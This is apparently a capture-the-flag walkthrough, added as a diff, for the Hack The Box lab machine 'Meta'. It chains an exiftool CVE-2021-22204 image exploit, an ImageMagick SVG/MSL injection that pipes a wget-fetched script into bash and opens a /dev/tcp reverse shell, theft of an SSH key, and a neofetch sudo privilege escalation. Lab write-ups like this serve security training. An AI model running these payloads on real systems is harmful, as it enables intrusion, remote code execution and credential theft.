@@ -1,0 +1,170 @@
+Machine-Name : Meta
+IP Address   : 10.129.75.44
+
+Command-Line: sudo nmap 10.129.75.44 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Notes: Visited IP in browser. Found "http://artcorp.htb". Added to /etc/hosts.
+
+Notes: Ran heavy recon against the URL using dirbuster and gobuster. Found a subdomain called "http://dev01.artcorp.htb".
+
+Notes: "http://dev01.artcorp.htb" shows a way to upload files. Link on page leads to "http://dev01.artcorp.htb/metaview/" which is a page that allows image uploads with a image data displayed.
+
+Notes: Running heavy recon on both URL's using dirbuster. Found "http://dev01.artcorp.htb/metaview/composer.json"
+
+Notes: "http://dev01.artcorp.htb/metaview/composer.json" gives the following information.
+Contents:
+{
+    "autoload": {
+        "files": ["lib/ExifToolWrapper.php"]
+    }
+}
+
+Notes: Possible exiftool exploit.
+
+Browser: exiftool exploit github
+Result:
+    https://github.com/convisolabs/CVE-2021-22204-exiftool
+
+Command-Line: sudo apt install djvulibre-bin exiftool
+Command-Line(~/HackingTools/): git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
+Result:
+    CVE-2021-22204-exiftool
+
+Command-Line: cd CVE-2021-22204-exiftool
+Notes: Changed IP to tun0 address and port to 9001 in exploit.config.
+
+Command-Line(~/HackingTools/CVE-2021-22204-exiftool): ./exploit.py
+Result:
+    1 image files updated (image.jpg)
+
+Command-Line: nc -lvnp 9001
+Notes: Back to the image-upload page, upload the image just created (image.jpg).
+Result:
+    **REVERSE-SHELL**
+    $
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")' && export TERM=linux
+Result:
+    www-data@meta:/var/www/dev01.artcorp.htb/metaview$
+
+CTRL + Z; stty raw -echo; fg; ENTER + ENTER;
+
+www-data@meta:/var/www/dev01.artcorp.htb$ find / -type f -printf "%T+ %p\n" 2>/dev/null | grep 2022-0
+Result:
+    2022-01-03+10:13:19.8059060230 /usr/local/bin/convert_images.sh
+
+www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd ../
+www-data@meta:/var/www/dev01.artcorp.htb$ ls
+Result:
+    convert_images  index.php  metaview
+www-data@meta:/var/www/dev01.artcorp.htb$ whereis convert_images
+Result:
+    convert_images: /usr/local/bin/convert_images.sh
+
+www-data@meta:/var/www/dev01.artcorp.htb$ cat /usr/local/bin/convert_images.sh
+Result:
+    #!/bin/bash
+    cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
+    pkill mogrify
+
+Notes: From the /var/www/dev01.artcorp.htb/convert_images/ dir, the command "mogrify -format png *.* 2>/dev/null" is called, then the mogrify process is terminated using "pkill".
+
+Browser: ImageMagick shell injection mogrify
+Result:
+    https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
+
+www-data@meta:/var/www/dev01.artcorp.htb$ cd convert_images
+
+Command-Line: mkdir www && cd www && echo "bash -i >& /dev/tcp/10.10.14.49/9002 0>&1" >> shell.txt
+Command-Line(./www): sudo python3 -m http.server --bind 10.10.14.49 80
+Command-Line: nc -lvnp 9002
+
+www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ nano pwn.svg
+Contents:
+    <image authenticate='ff" `wget 10.10.14.49/shell.txt -O - | bash`;"'>
+      <read filename="pdf:/etc/passwd"/>
+      <get width="base-width" height="base-height" />
+      <resize geometry="400x400" />
+      <write filename="test.png" />
+      <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+      <image xlink:href="msl:pwn.svg" height="100" width="100"/>
+      </svg>
+    </image>
+
+
+Notes: Waiting for cron to execute the file. Cron executes file and "thomas" shell is given.
+Result:
+    thomas@meta:/var/www/dev01.artcorp.htb/convert_images$
+    **USER ACCESS**
+
+thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /home/thomas/user.txt
+Result:
+    4d4740574af8abadf9eea6c34244a6e7
+    **USER OWNED**
+
+Notes: Getting ssh shell.
+
+thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ cd
+thomas@meta:/home/thomas/.ssh$ cat id_rsa
+Notes: Copied SSH key to local computer.
+Result:
+    ./thomas/ssh/id_rsa
+
+Command-Line(./thomas/ssh): chmod 600 id_rsa
+
+Command-Line(./thomas/ssh): ssh -i id_rsa thomas@10.129.75.44
+Result:
+    thomas@meta:~$
+
+thomas@meta:~$ sudo -l
+Result:
+    Matching Defaults entries for thomas on meta:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME
+
+    User thomas may run the following commands on meta:
+        (root) NOPASSWD: /usr/bin/neofetch \"\"
+
+thomas@meta:~$ find . neofetch
+Result:
+    ./.profile
+    ./.config
+    ./.config/neofetch
+    ./.config/neofetch/config.conf
+    ./.ssh
+    ./.ssh/id_rsa
+    ./.ssh/authorized_keys
+    ./.ssh/id_rsa.pub
+    ./.bash_logout
+    ./.gnupg
+    ./.gnupg/private-keys-v1.d
+    ./user.txt
+    ./.bashrc
+    ./.bash_history
+
+thomas@meta:~$ cd .config/neofetch
+thomas@meta:~/.config/neofetch$ ls -la
+Result:
+    total 24
+    drwxr-xr-x 2 thomas thomas  4096 Dec 20  2021 .
+    drwxr-xr-x 3 thomas thomas  4096 Aug 30  2021 ..
+    -rw-r--r-- 1 thomas thomas 14591 Aug 30  2021 config.conf
+
+Browser: neofetch exploit
+Result:
+    https://gtfobins.github.io/gtfobins/neofetch/
+
+thomas@meta:~/.config/neofetch$ export XDG_CONFIG_HOME=/home/thomas/.config
+thomas@meta:~/.config/neofetch$ echo 'exec /bin/sh' >> config.conf
+thomas@meta:~/.config/neofetch$ sudo /usr/bin/neofetch \"\"
+Result:
+    #
+    **ROOT ACCESS**
+
+# cat /root/root.txt
+Result:
+    7fbab6c7ef54239c878d6d7bec1d1f4e
+    **ROOT OWNED**
+
+      **FINISHED**
